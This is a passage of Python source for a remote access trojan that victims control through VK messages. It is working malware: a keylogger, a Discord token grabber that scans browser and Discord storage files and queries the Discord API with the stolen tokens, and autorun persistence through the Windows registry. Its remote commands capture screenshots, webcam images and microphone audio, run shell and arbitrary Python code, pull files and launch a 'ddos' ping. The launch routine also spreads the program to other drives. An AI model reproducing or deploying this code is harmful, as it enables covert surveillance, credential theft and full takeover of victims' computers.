            # If empty.

            # Returning.
            return

        # Getting tags.
        tags = arguments.pop(0)

        if tags == "alive":
            # If this is network command (That is work without tags and for all).

            if peer_is_allowed(message.peer_id):
                # If peer is alowed

                # Answering that we in network.
                answer_text = command_alive("", event).get_text()
            else:
                # Answering with an error.
                answer_text = "Sorry, but you don't have required permissions to call this command!"
        else:
            # If this is not alive command.

            if list_intersects(parse_tags(tags), client_tags):
                # If we have one or more tag from our tags.

                if peer_is_allowed(message.peer_id):
                    # If peer is allowed.

                    if len(arguments) == 0:
                        # If there is no command (just tags only).

                        # Responding with error.
                        answer_text = "Invalid request! Message can`t be parsed! Try: tag1, tag2; command; args"
                    else:
                        # If there is no error.

                        # Getting command itself.
                        command = str(arguments.pop(0)).lower().replace(" ", "")

                        # Getting arguments (Joining all left list indices together).
                        command_arguments = ";".join(arguments)

                        # Executing command.
                        command_result: CommandResult = execute_command(command, command_arguments, event)

                        # Get attachment.
                        command_result_attachment = command_result.get_attachment()


                        if command_result_attachment is not None:
                            # If response is attachment.

                            # Getting values.
                            uploading_path, uploading_title, uploading_type = command_result_attachment

                            if uploading_type == "photo":
                                # If this is just photo.

                                # Upload photo.
                                answer_text = uploading_title
                                answer_attachment = server_upload_photo(uploading_path)
                            elif uploading_type in ("doc", "audio_message"):
                                # If this is document or audio message.

                                # Uploading file on the server.
                                uploading_status, uploading_result = \
                                    server_upload_document(uploading_path, uploading_title,
                                                           message.peer_id, uploading_type)

                                if uploading_status:
                                    # If uploading file result is OK.

                                    # Setting response.
                                    answer_text = uploading_title
                                    answer_attachment = uploading_result
                                else:
                                    # If there is an error.

                                    # Setting response.
                                    answer_text = f"Error when uploading document with type `{uploading_type}`. " \
                                                  f"Result - {uploading_result}"

                            if config["settings"]["delete_file_after_uploading"] and \
                                    command_result.should_delete_after_uploading():
                                # If should delete.

                                # Try delete.
                                filesystem_try_delete(uploading_path)
                        else:
                            # If no attachment response.

                            # Getting text.
                            answer_text = command_result.get_text()
                else:
                    # If not is admin.

                    # Answering with an error.
                    answer_text = "Sorry, but you don't have required permissions to make this command!"
            else:
                # If lists of tags not intersects.

                # Returning.
                return
    except Exception as exception:  # noqa
        # If there an exception.

        # Getting exception answer.
        answer_text = f"Failed to process message answer. Exception - {exception}"

    if answer_text or answer_attachment:
        # If response is not blank.

        # Send message back to server.
        server_message(answer_text, answer_attachment, message.peer_id)


# Debug.

def debug_message(message: str) -> None:
    """ Show debug message if debug mode."""

    if not DEBUG:
        # If debug is not enabled.

        # Returning.
        return

    # Printing message.
    print(message)


# Keylogger.

def keylogger_start() -> None:
    """ Starts keylogger (Add keyboard callback). """

    if not FEATURE_KEYLOGGER_ENABLED:
        # If keylogger is disabled.

        # Returning.
        debug_message("[Keylogger] Not starting, as disabled...")
        return

    try:
        # Trying to import keyboard module which is not preinstalled.

        # Importing keyboard module.
        import keyboard
    except ImportError:
        # If there is ImportError occurred.

        # Debug message.
        debug_message("[Keylogger] Can`t start as there is no required module with name \"keyboard\"!")

        # Returning and not starting keylogger.
        return

    # Setting keyboard on release trigger to our callback event function.
    keyboard.on_release(callback=keylogger_callback_event)
    debug_message("[Keylogger] Registered callback event...")

    # Debug message.
    debug_message("[Keylogger] Started!")


def keylogger_callback_event(keyboard_event):
    """ Process keyboard callback event for keylloger. """

    try:
        # Getting keyboard key from the keyboard event.
        keyboard_key = str(keyboard_event.name)

        # Globalising keylogger string.
        global keylogger_buffer

        if type(keyboard_key) == str:
            # If this is string.
            if len(keyboard_key) > 1:
                # If this is not the only 1 char.

                if keyboard_key == "space":
                    # If this is space key.

                    # Adding space.
                    keylogger_buffer = " "
                elif keyboard_key == "enter":
                    # If this enter key.

                    # Adding newline.
                    keylogger_buffer = "\n"
                elif keyboard_key == "decimal":
                    # If this is decimal key.

                    # Adding dot.
                    keylogger_buffer = "."
                elif keyboard_key == "backspace":
                    # If this is backspace key.

                    # Deleting from the keylog.
                    keylogger_buffer = keylogger_buffer[:-1]
                else:
                    # If this is some other key.

                    # Formatting key.
                    keyboard_key = keyboard_key.replace(" ", "_").upper()

                    # Adding it to the keylog.
                    keylogger_buffer = f"[{keyboard_key}]"
            else:
                # If this is only 1 char.

                # Adding key (char) to the keylogger string.
                keylogger_buffer += keyboard_key
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message("[Keylogger] Failed to process keyboard event! Exception - {exception}")


# Server.

def server_connect() -> None:
    """ Connects to the server. """

    # Globalising variables.
    global server_api
    global server_longpoll

    # Debug message.
    debug_message(f"[Server] Connecting to the server...")

    # Base server type.
    server_type = None

    try:
        # Trying to connect to server.

        if "server" not in config or "type" not in config["server"]:
            # If not config server type key.

            # Error.
            debug_message(f"[Server] Failed to get configuration server->type value key! "
                          f"Please check configuration file!")
            sys.exit(1)

        # Reading server type.
        server_type = config["server"]["type"]
        
        if server_type in ("VK_USER", "VK_GROUP"):
            # If one of the VK server type.

            # Debug message.
            debug_message(f"[Server] Selected VK \"{server_type}\" server type...")

            # Get config server access token.
            access_token = config["server"]["vk"]["user" if server_type == "VK_USER" else "group"]["access_token"]

            # Importing longpoll.
            if server_type == "VK_GROUP":
                import vk_api.bot_longpoll
            else:
                import vk_api.longpoll

            # Connect to the VK API.
            server_api = vk_api.VkApi(token=access_token)

            # Connecting to the longpoll.
            if server_type == "VK_GROUP":

                # Get VK group index.
                group_index = config["server"]["vk"]["group"]["index"]

                # Connect group longpoll.
                server_longpoll = vk_api.bot_longpoll.VkBotLongPoll(server_api, group_index)
            else:
                # Connect user longpoll.
                server_longpoll = vk_api.longpoll.VkLongPoll(server_api)
        else:
            # If invalid config server type.

            # Error.
            debug_message(f"[Server] Failed to connect with current server type, "
                          f"as it may be not implemented / exists. Server type - {server_type}")
            exit(1)
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Error.
        debug_message(f"[Server] Failed to connect with server! Exception - {exception}")
        exit(1)

    # Debug message.
    debug_message(f"[Server] Connected to the server with type - {server_type}")


def server_listen() -> None:
    """ Listen server for new messages. """

    if server_longpoll is None:
        # If server longpoll is not connected.

        # Error.
        debug_message(f"[Server] Failed to start server listening as server longpoll is not connected!")
        exit(1)

    if "server" not in config or "type" not in config["server"]:
        # If not config server type key.

        # Error.
        debug_message(f"[Server] Failed to get configuration server->type value key! Please check configuration file!")
        exit(1)

    # Reading server type.
    server_type = config["server"]["type"]
    
    # Message.
    debug_message("[Server] Starting listening...")

    if server_type in ("VK_USER", "VK_GROUP"):
        # If one of the VK server type.

        while True:
            # Infinity loop.

            try:
                # Trying to listen.

                # Get required message event.
                if server_type == "VK_USER":
                    message_event = vk_api.longpoll.VkEventType.MESSAGE_NEW  # noqa
                elif server_type == "VK_GROUP":
                    message_event = vk_api.bot_longpoll.VkBotEventType.MESSAGE_NEW  # noqa
                else:
                    # Error.
                    debug_message(f"[Server] Failed to start server listening with current server type, "
                                  f"as it may be not implemented / exists. Server type - {server_type}")
                    return

                for event in server_longpoll.listen():  # noqa
                    # For every message event in the server longpoll listening.

                    if event.type == message_event:
                        # If this is message event.

                        # Processing client-server answer.
                        process_message(event)
                    
            except Exception as exception:  # noqa
                # If there is exception occurred.

                # Error.
                debug_message(f"[Server] Failed to listen server. Exception - {exception}")
    else:
        # If invalid config server type.

        # Error.
        debug_message(f"[Server] Failed to listen with current server type, as it may be not implemented / exists. "
                      f"Server type - {server_type}")
        exit(1)


def server_method(method: str, parameters: typing.Dict, is_retry=False) -> typing.Optional[typing.Any]:
    """ Calls server method. """

    if server_api is None:
        # If no server API.

        # Just return.
        return None

    try:
        # Trying to call method.

        if "random_id" not in parameters:
            # If there is no random id.

            # Adding random id.
            parameters["random_id"] = vk_api.utils.get_random_id()

        # Executing method.
        return server_api.method(method, parameters)  # noqa
    except Exception as exception:  # noqa
        # Error.

        # Message.
        debug_message(f"[Server] Error when trying to call server method (API)! Exception - {exception}")

        # Rading config.
        retry_on_fail = config["server"]["vk"]["retry_method_on_fail"]

        if is_retry or not retry_on_fail:
            # If this is already retry.

            # Returning.
            return None
        else:
            # If this is not retry.

            # Retrying.
            return server_method(method, parameters, True)


def server_message(text: str, attachmment: str = None, peer: int = None) -> None:
    """ Sends mesage to the server. """

    if peer is None:
        # If peer index is not specified.

        for config_peer in config["server"]["vk"]["peers"]:
            # For every peer index in config peer indices.

            # Sending messages to they.
            server_message(text, attachmment, config_peer)

        # Not process code below (recursion).
        return

    # Adding name to the text.
    _text = f"<{client_name}>\n{text}"

    # Debug message.
    debug_message("[Server] Sent new message!")

    # Calling method.
    server_method("messages.send", {
        "message": _text,
        "attachment": attachmment,
        "peer_id": peer
    })


def server_upload_document(path: str, title: str, peer: int, document_type: str = "doc") -> \
        typing.Tuple[bool, typing.Union[str, typing.Any]]:
    """ Uploads document to the server and returns it (as document string). """

    try:
        # Trying to upload document.

        # Getting api for the uploader.
        server_docs_api = server_api.get_api().docs # noqa

        # Getting upload url.
        if "upload_url" in (upload_server := server_docs_api.getMessagesUploadServer(type=document_type, peer_id=peer)):
            # If there is our URL.

            # Get URL.
            upload_url = upload_server["upload_url"]
        else:
            # If no.

            # Error.
            return False, "Upload Server Error" + str(upload_server)

        # Posting file on the server.
        request = json.loads(requests.post(upload_url, files={
            "file": open(path, "rb")
        }).text)

        if "file" in request:
            # If there is all fields in response.

            # Saving file to the docs.
            request = server_docs_api.save(file=request["file"], title=title, tags=[])

            # Get fields.
            document_id = request[document_type]["id"]
            document_owner_id = request[document_type]["owner_id"]

            # Returning document.
            return True, f"doc{document_owner_id}_{document_id}"
        else:
            # If there is not all fields.

            # Debug message.
            debug_message(f"[Server] Error when uploading document (Request)! Request - {request}")

            # Returning request as error.
            return False, "Request Error" + str(request)
    except Exception as exception:  # noqa
        # If there is error.

        # Debug message.
        debug_message(f"Error when uploading document (Exception)! Exception: {exception}")

        # Returning exception.
        return False, "Exception Error" + str(exception)


# File System.

def filesystem_try_delete(path) -> bool:
    """ Tries to delete given file"""

    try:
        # Deleting.
        os.remove(path)

        # All OK.
        return True
    except Exception:  # noqa
        # Error.

        # Base case.
        return False


def filesystem_try_listdir(path) -> typing.List:
    """ Tries to list directory. """

    try:
        # Listing.
        return os.listdir(path)
    except Exception:  # noqa
        # Error.

        # Base case.
        return []


def filesystem_get_size(path: str) -> float:
    # @function filesystem_get_size()
    # @returns float
    # @description Function that returns size of the item in megabytes.

    # Megabyte size.
    mb_size = 1024 * 1024

    if os.path.exists(path):
        # If path exists.
        if os.path.isfile(path):
            # If this is file.

            # Getting size of the file.
            return int(os.path.getsize(path) / mb_size)
        elif os.path.isdir(path):
            # If this is directory.

            # Returning size of self and childrens.
            childrens_size = sum([filesystem_get_size(os.path.join(path, directory))
                                  for directory in filesystem_try_listdir(path)])
            return os.path.getsize(path) / mb_size + childrens_size

    # Error.
    return 0


def filesystem_get_type(path: str) -> str:
    """ Returns type of the path. """

    if os.path.isdir(path):
        # If this is directory.

        # Returning directory.
        return "Directory"
    elif os.path.isfile(path):
        # If this is file.

        # Returning file.
        return "File"
    elif os.path.islink(path):
        # If this is link.

        # Returning link.
        return "Link"
    elif os.path.ismount(path):
        # If this is mount.

        # Returning mount.
        return "Mount"

    # Returning unknown type if not returned any above.
    return "Unknown"


def filesystem_build_path(path: str) -> None:
    """ Builds path. """

    try:
        # Trying to build path.

        # Getting path elements (split by \\)
        path_elements = path.split("\\")

        # Removing last element (filename)
        path_elements.pop()

        # Converting back to the string
        path = "\\".join(path_elements)

        if not os.path.exists(path):
            # If path not exists.

            # Making directories.
            os.makedirs(path)
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"[File System] Failed to build path! Path - {path}. Exception - {exception}")


def filesystem_get_drives_list() -> typing.List:
    """ Returns list of all drives in the system. """

    try:
        # Getting drive letters.
        drives_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

        # Returning list.
        return ["%s:\\\\" % drive_letter for drive_letter in drives_letters
                if os.path.exists('%s:\\\\' % drive_letter)]
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Error.
        debug_message(f"[File System] Failed to get drives list! Exception - {exception}")

    # Base list.
    return []


# Tags.

def get_default_tags() -> typing.List:
    """ Returns default tags. """

    # Tags.
    default_tags = [get_ip()["ip"], get_operating_system(), "PC"]

    if FEATURE_STARTUP_HWID_GRABBING_ENABLED:
        # If we enabled HWID.

        # Adding HWID.
        default_tags.append(get_hwid())

    # Returning tags.
    return default_tags


def reset_tags() -> None:
    """ Resets tags. """

    # Globalising tags.
    global client_tags

    # Tags list.
    client_tags = get_default_tags()

    # Saving tags.
    save_tags()


def load_tags() -> None:
    """ Loads all tags data. """

    # Globalising tags.
    global client_tags

    try:
        # Trying to load tags.

        # Getting path.
        path = folder + config["paths"]["tags"]

        # Building path.
        filesystem_build_path(path)

        if os.path.exists(path):
            # If we have tags file.

            try:
                # Trying to read tags.

                with open(path, "r", encoding="UTF-8") as tags_file:
                    # With opened file.

                    # Reading tags.
                    client_tags = json.loads(tags_file.read())["tags"]
            except Exception as exception:  # noqa
                # If there is exception occurred.

                # Debug message.
                debug_message(f"[Tags] Failed to load tags file, resetting tags! Exception: {exception}")

                # Reset tags.
                reset_tags()
        else:
            # If no file.

            # Message.
            debug_message("[Tags] Not found tags file, resetting to default!")
        
            # Reset tags.
            reset_tags()
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"[Tags] Failed to load tags, set tags to error! Exception - {exception}")

        # Setting error tags.
        client_tags = DEFAULT_INVALID_TAGS

    # Message.
    debug_message("[Tags] Loading complete!")


def parse_tags(tags: str) -> typing.List:
    """ Parse tags for command calling. """

    # Returning.
    return tags.replace("[", "").replace("]", "").split(",")


def save_tags() -> None:
    """ Saves tags to the file. """

    try:
        # Trying to save tags.

        # Message.
        debug_message("[Tags] Saving tags to the file...")

        # Getting path.
        path = folder + config["paths"]["tags"]

        # Building path.
        filesystem_build_path(path)

        with open(path, "w", encoding="UTF-8") as tags_file:
            # With opened file.

            # Writing tags.
            tags_file.write(json.dumps({
                "tags": client_tags
            }))
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"[Tags] Failed to save tags! Exception - {exception}")


# Utils.

def list_intersects(list_a: typing.List, list_b: typing.List) -> bool:
    """ Returns true if any of the item is intersects. """

    # Checking intersection.
    for item in list_a:
        # For items in list A.

        if item in list_b:
            # If item in list B.

            # Return True.
            return True

    # No intersection.
    return False


def list_difference(list_a, list_b) -> typing.List:
    """ Function that returns difference between given two lists. """

    # Returning.
    return [element for element in list_a if element not in list_b]


def get_operating_system() -> str:
    """ Returns current operating system. """

    if sys.platform.startswith("win32"):
        # If this is windows.

        # Returning windows.
        return "Windows"

    if sys.platform.startswith("linux"):
        # If this is linux.

        # Returning linux.
        return "Linux"

    # Unsupported operating system
    return f"UNKNOWN_OS_{sys.platform}"


def get_hwid() -> str:
    """ Returns system unique hardware index. """

    try:
        # Trying to get HWID

        # Command to execute.
        hwid_grab_command = "wmic csproduct get uuid"

        # Opening process.
        with open("NUL", "w", encoding="UTF-8") as void_file:
            # TODO. When there is DEBUG flag, not write to file.
            # That file is disables console out.
            process = subprocess.Popen(hwid_grab_command, shell=True, stdin=void_file, stdout=void_file,
                                       stderr=void_file)

        # Returning HWID.
        return str((process.stdout.read() + process.stderr.read()).decode().split("\n")[1])
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"[HWID] Failed to grab from the system! Exception - {exception}")

        # Returning default.
        return DEFAULT_INVALID_HWID


def get_ip() -> typing.Dict:
    """ Returns IP information. """

    try:
        # Trying to get IP.

        # API Provider.
        api_provider = "https://ipinfo.io/json"

        # Returning JSON data.
        return requests.get(api_provider).json()
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"[IP] Failed to grap IP from the system! Exception - {exception}")

    # Returning zero-ip.
    return {
        "ip": DEFAULT_INVALID_IP
    }


def get_environment_variables() -> typing.Dict:
    """ Returns list of all environment variables in system. """

    # Return list of environment variables.
    return {variable: os.environ.get(variable) for variable in os.environ}


def executable_get_extension() -> str:
    """ Returns current executable extension. """

    # Return.
    return sys.argv[0].split(".")[-1]


def record_microphone(path, seconds: int = 1) -> None:
    """ Records microphone. """

    # Importing.
    try:
        # Trying to import modules.

        # Importing.
        import pyaudio
        import wave
    except ImportError:
        # If there is import error.

        # Not supported.
        debug_message("[Microphone] Recording microphone is not supported on selected PC! "
                      "(opencv-python (CV2) module is not installed)")

        # Returning.
        return

    # Creating audio port.
    audio = pyaudio.PyAudio()

    # Opening audio stream.
    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, frames_per_buffer=1024, input=True)

    # Frames list.
    frames = []

    # Writing data stream.
    for _ in range(0, int(44100 / 1024 * int(seconds))):
        data = stream.read(1024)
        frames.append(data)

    # Stopping.
    stream.stop_stream()
    stream.close()
    audio.terminate()

    # Validating filename.
    filesystem_build_path(path)

    # Save recording as wav file.
    file = wave.open(path, 'wb')
    file.setnchannels(1)
    file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
    file.setframerate(44100)
    file.writeframes(b''.join(frames))
    file.close()


# Commands.

def initialise_commands() -> None:
    """ Initialises commands. """

    # Globalising command functions and help.
    global commands_functions
    global commands_help

    # Commands function.
    commands_functions = {
        "screenshot": command_screenshot,
        "webcam": command_webcam,
        "microphone": command_microphone,
        "help": command_help,
        "version": command_version,
        "tags": command_tags,
        "location": command_location,
        "keylog": command_keylog,
        "taskkill": command_taskkill,
        "cd": command_cd,
        "ls": command_ls,
        "drives": command_drives,
        "discord_tokens": command_discord_tokens,
        "discord_profile": command_discord_profile,
        "discord_profile_raw": command_discord_profile_raw,
        "tags_new": command_tags_new,
        "tags_add": command_tags_add,
        "shutdown": command_shutdown,
        "restart": command_restart,
        "console": command_console,
        "upload": command_upload,
        "ddos": command_ddos,
        "link": command_link,
        "name_new": command_name_new,
        "exit": command_exit,
        "python": command_python,
        "message": command_message,
        "destruct": command_destruct,
        "download": command_download,
        "properties": command_properties,
        "alive": command_alive
    }

    # Commands help.
    commands_help = {
        "discord_profile_raw": (
            "Returns you all RAW (as dict (JSON)) information about client Discord profile",
            "discord_profile_raw"
        ),
        "discord_tokens": (
            "Returns you all found Discord tokens in client system",
            "discord_tokens"
        ),
        "discord_profile": (
            "Returns you all information about client Discord profile",
            "discord_profile"
        ),
        "download": (
            "Downloads file from the client client.",
            "download [required]PATH"
        ),
        "screenshot": (
            "Returns you an photo (screenshot) from screen of the client.",
            "screenshot"
        ),
        "webcam": (
            "Returns you an photo from webcam of the client (Only if it connected to the PC).",
            "webcam"
        ),
        "microphone": (
            "Returns you an voice message from microphone of the client, "
            "for that amount of the seconds that you specify (Only if it connected to the PC).",
            "microphone [optional, default is 1]SECONDS"
        ),
        "help": (
            "Returns list of the all commands in the app, "
            "if you specify command, shows documentation to given command itself.",
            "help [optional]COMMAND"
        ),
        "version": (
            "Returns current version of the app instance that is currently running on the client PC "
            "(That is get this command).",
            "version"
        ),
        "tags": (
            "Returns an list separated by ,(comma) of the all tags that have called instance of the app.",
            "tags"
        ),
        "location": (
            "Returns location (fully not very precise) of the client (Gets throughout IP).", "location"
        ),
        "keylog": (
            "Returns log of the keylogger.",
            "keylog"
        ),
        "cd": (
            "Changes directory of the files commands, if you don't specify directory, this will show it"
            "(Write only name of directory in current directory or full path itself).",
            "cd [optional]DIRECTORY"
        ),
        "ls": (
            "Returns list of the files in current directory (Or directory that you specify) separated by ,(comma).",
            "ls"
        ),
        "drives": (
            "Returns list of the all drives in the system separated by ,(comma)",
            "drives"
        ),
        "tags_new": (
            "Replaces all old tags with these new.",
            "tags_new [required]TAGS(Separated by;)"
        ),
        "tags_add": (
            "Adds given tags to all other tags.",
            "tags_add [required]TAGS(Separated by ;)"
        ),
        "shutdown": (
            "Shutdowns client PC.",
            "shutdown"
        ),
        "restart": (
            "Restarts client PC.",
            "restart"
        ),
        "console": (
            "Executes console command and returns it code (0 if all OK)",
            "console"
        ),
        "ddos": (
            "Pings given address",
            "ddos [required]ADDRESS"
        ),
        "link": (
            "Opens link in a client browser.",
            "link [required]URI"
        ),
        "name_new": (
            "Replaces old name with this name",
            "name_new [required]NAME"
        ),
        "exit": (
            "Exits app (Will be launched when PC is restarted)",
            "exit"
        ),
        "python": (
            "Executes python code, if you want to get output write - global out "
            "out = \"Hello World!\" and this is gonna be shown.",
            "python [required]CODE"
        ),
        "message": (
            "Shows message to the user. (Styles - from 0 to 6, changes buttons)",
            "message [required]TEXT;TITLE[optional];STYLE[optional]"
        ),
        "destruct": (
            "Delete app from the system (Removing from the autorun and closing)",
            "destruct"
        ),
        "alive": (
            "Shows current time",
            "alive"
        )
    }


# Discord.

def discord_api_call(method: str, params: typing.Dict, func, data, token: str) -> typing.Any:
    """ Calls Discord API. """

    # This code is from my other repo -> https://gtihub.com/kirillzhosul/python-discord-token-grabber

    # Calling.
    return func(
        f"https://discord.com/api/{method}",
        params=params,
        headers={
            "Authorization": f"{token}",
            "Content-Type": "application/json"
        },
        data=data
    )


# Stealer.

def stealer_steal_discord_profile(tokens: typing.List[str] = None) -> typing.Optional[typing.Dict]:
    """ Steals all discord profile information. """

    if tokens is None:
        # If tokens is not given.

        # Grabbing tokens from system.
        tokens = stealer_steal_discord_tokens()

    if not tokens:
        # If no tokens.

        # Returning None.
        return None

    # Returning API response.
    api_response: requests.Response = discord_api_call("users/@me", {}, requests.get, None, tokens[0])
    return api_response.json()


def stealer_steal_discord_tokens() -> typing.List[str]:
    """ Steals all discord tokens. """

    # This code is from my other repo -> https://gtihub.com/kirillzhosul/python-discord-token-grabber

    # Get appdata paths.
    appdata_roaming = os.getenv("APPDATA", "")
    appdata_local = os.getenv("LOCALAPPDATA", "")

    # Paths where tokens exists.
    paths: typing.List[str] = [
        appdata_roaming + "\\Discord\\Local Storage\\leveldb",
        appdata_roaming + "\\discordcanary\\Local Storage\\leveldb",
        appdata_roaming + "\\discordptb\\Local Storage\\leveldb",
        appdata_roaming + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        appdata_local + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
        appdata_local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
        appdata_local + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"
    ]

    # Tokens that we got.
    tokens: typing.List[str] = []

    for token_path in (path for path in paths if os.path.exists(path)):
        # For existing paths.

        for log_file in (file for file in filesystem_try_listdir(token_path) if
                         file.endswith(".log") or file.endswith(".ldb")):
            # For log files in folder.

            # Opening file.
            with open(f"{token_path}\\{log_file}", errors="ignore", encoding="UTF-8") as file:
                # Opening file.

                for line in [line.strip() for line in file.readlines() if line.strip()]:
                    # Getting all lines.

                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        # Checking all regexs.

                        for token in re.findall(regex, line):
                            # Grabbing token.

                            if "mfa." in token:
                                # Adding token.
                                tokens.append(token)

    # Returning not-same tokens.
    return list(set(tokens))


def stealer_is_already_worked() -> bool:
    """ Returns true if stealer already worked. """

    # Getting path to anchor file.
    path: str = folder + config["paths"]["anchor"]

    if not os.path.exists(path):
        # If anchor file not exists.

        # Validating file.
        filesystem_build_path(path)

        # Creating file.
        with open(path, "w", encoding="UTF-8") as anchor_file:
            anchor_file.write("Anchor")

        # Returning that not worked.
        return False

    # Returning true if worked.
    return True


# Autorun.

def autorun_register() -> None:
    """ Registers current file to the autorun registry (if executable). """

    if not FEATURE_AUTORUN_ENABLED:
        # If autorun is disabled.

        # Debug message.
        debug_message("[Autorun] Not registering, as disabled...")

        # Return.
        return

    if executable_get_extension() != "exe" and DISALLOW_NOT_EXECUTABLE_AUTORUN:
        # If this is not exe file.

        # Debug message.
        debug_message("[Autorun] Not registering, as running not from final executable file (not a .exe), "
                      "if you prefer to register anyway, change value in DISALLOW_NOT_EXECUTABLE_AUTORUN flag")

        # Returning.
        return

    if not sys.platform.startswith("win32"):
        # If not windows family.
        
        # Debug message.
        debug_message("[Autorun] Not registering, as running not from Windows-Family OS.")

        # Returning.
        return
    
    try:
        # Trying to import winreg module.

        # Importing.
        import winreg
    except ImportError:
        # If there is ImportError.

        # Debug message.
        debug_message("[Autorun] Failed to regiter self to the autorun! "
                      "Could not import module winreg that is required for that!")

        # Returning.
        return

    try:
        # Trying to add to the autorun.

        # Getting executable path.
        executable_filename = config["autorun"]["executable"]
        executable_path = f"{folder}{executable_filename}.{executable_get_extension()}"

        if not os.path.exists(executable_path):
            # If no file there (We don't add this already.

            # Building path.
            filesystem_build_path(executable_path)

            # Copying executable there.
            shutil.copyfile(sys.argv[0], executable_path)

        # Opening key.
        registry_key = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
                                      sub_key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                      reserved=0, access=winreg.KEY_ALL_ACCESS)

        # Adding autorun.
        winreg.SetValueEx(registry_key, config["autorun"]["name"], 0, winreg.REG_SZ, executable_path)

        # Closing key.
        winreg.CloseKey(registry_key)

        # Debug message.
        debug_message("[Autorun] Successfully regitering self to the registry!")
    except Exception as exception:  # noqa
        # If error occurred.

        # Debug message.
        debug_message(f"[Autorun] Failed to regiter self to the registry! Exception - {exception}")


def autorun_unregister() -> None:
    """ Unegisters current file to the autorun registry (if executable). """

    if not FEATURE_AUTORUN_ENABLED:
        # If autorun is disabled.

        # Debug message.
        debug_message("[Autorun] Not unregistering, as disabled...")
        return

    if executable_get_extension() != "exe" and DISALLOW_NOT_EXECUTABLE_AUTORUN:
        # If this is not exe file.

        # Debug message.
        debug_message("[Autorun] Not unregistering, as running not from final executable file (not a .exe), "
                      "if you prefer to register anyway, change value in DISALLOW_NOT_EXECUTABLE_AUTORUN flag")
        return

    if not sys.platform.startswith("win32"):
        # If not windows family.
        
        # Debug message.
        debug_message("[Autorun] Not unregistering, as running not from Windows-Family OS.")
        return
    
    try:
        # Trying to import winreg module.

        # Importing.
        import winreg
    except ImportError:
        # If there is ImportError.

        # Debug message.
        debug_message("[Autorun] Failed to unregister self from the autorun! Could not import module winreg")
        return

    try:
        # Trying to remove autorun.

        # Opening key.
        registry_key: winreg.HKEYType = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
                                                       sub_key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                                       reserved=0, access=winreg.KEY_ALL_ACCESS)

        # Deleting autorun.
        winreg.DeleteValue(registry_key, config["autorun"]["name"])

        # Closing key.
        winreg.CloseKey(registry_key)
    except Exception as exception:  # noqa
        # If error occurred.

        # Debug message.
        debug_message(f"[Autorun] Failed to unregister self from the autorun! Exception: {exception}")


# Config.

def load_config() -> None:
    """ Loads config values. """

    # Globalise config and folder.
    global config
    global folder

    # Opening JSON file
    try:
        with open("config.json", "r", encoding="UTF-8") as config_file:
            config = json.load(config_file)
    except FileNotFoundError:
        # If config not exists.
        debug_message("[Config] Failed to load config file as it is not found! Please read more wiki...")

    if not config:
        # If empty.

        # Error.
        debug_message("[Config] Failed to load! Is config file empty?")
        sys.exit(1)

    # Update folder.
    if "paths" in config and "main" in config["paths"]:
        # If path found.

        # Read.
        folder = os.getenv("APPDATA") + config["paths"]["main"]
    else:
        # Error.
        debug_message("[Config] Failed to load main folder in paths->main! Is config file invalid?")
        sys.exit(1)

    # Message.
    debug_message("[Config] Loading complete!")


# Other.

def peer_is_allowed(peer: str) -> bool:
    """ Returns is peer is allowed or not. """

    # Get peers.
    peers: typing.List = config["server"]["vk"]["peers"]

    if peers is None or len(peers) == 0:
        # If there is no peers in the list

        # Returning true as there is no peers.
        return True

    # Returning.
    return peer in peers


def exit_handler() -> None:
    """ Should be registered as exit handler (at_exit). """

    # Sever message.
    server_message("Disconnected from the network!")

    # Debug message.
    debug_message("[Exit Handler] Exit...")


def launch() -> None:
    """ Launchs all. """

    try:
        # Trying to initialise app.

        # Start message.
        debug_message("[Launch] Starting...")

        # Load config to work with values.
        load_config()

        # Asserting operating system, exiting if the operation system is not supported.
        assert_operating_system()

        # Initialising functions for the remote access.
        initialise_commands()

        # Loading tags from the system.
        load_tags()

        # Loading name from the system.
        load_name()

        # Start message.
        debug_message("[Launch] Tags and name loading completed!")

        # Connecting to the server.
        server_connect()

        # Starting spreading on the other drives.
        spreading_start()

        # Starting keylogger that will steals all keys pressed.
        keylogger_start()

        # Registering in the autorun.
        autorun_register()

        # Message that we connected to the network.
        server_message(f"Connected to the network! (His tags: {', '.join(client_tags)})")

        # Registering exit_handler() as handler for exit.
        atexit.register(exit_handler)

        # Start message.
        debug_message("[Launch] Almost done, stealing data...")

        # Stealing all of the data.
        stealer_steal_data()

        # Start message.
        debug_message("[Launch] Launch end! Starting listening server...")

        # Starting listening messages.
        server_listen()
    except Exception as launch_exception:  # noqa
        # If there is exception occurred.

        # Error.
        debug_message(f"[Launch] Failed to launch! Exception - {launch_exception}")
        sys.exit(1)


# Entry point of the app, calling launch function to start all systems.
launch()
